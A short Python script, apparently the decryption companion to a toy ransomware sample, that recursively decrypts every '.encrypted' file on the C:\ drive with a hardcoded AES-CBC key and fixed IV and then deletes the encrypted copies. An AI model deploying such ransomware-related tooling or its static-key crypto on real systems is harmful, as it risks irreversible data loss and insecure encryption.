from Crypto.Cipher import AES
import os
import glob

def pad(s):
    return s + b"\0" * (AES.block_size - len(s) % AES.block_size)


def decrypt(cipher_text,key="ascftrgtyhjuikhg".encode()):
    iv = "jfhdgetdhsgethdg".encode()
    cipher = AES.new(key, AES.MODE_CBC, iv)
    plaintext = cipher.decrypt(cipher_text)
    return plaintext.rstrip(b"\0")


def decrypt_files(dir,key=None):
    liste_dir = []
    for i in glob.glob(f"{dir}/*"):
        if os.path.isdir(i):
            liste_dir.append(i)
        else:
            if ".encrypted" in i:
                with open(i,'rb') as file:
                    with open(i.replace('.encrypted',""),'wb') as file2:
                        if key==None:
                            file2.write(decrypt(file.read()))
                        else:
                            file2.write(decrypt(file.read(),key))
                os.remove(i)
            else:
                pass
    for i in liste_dir:
        decrypt_files(i)

decrypt_files("C:\\")
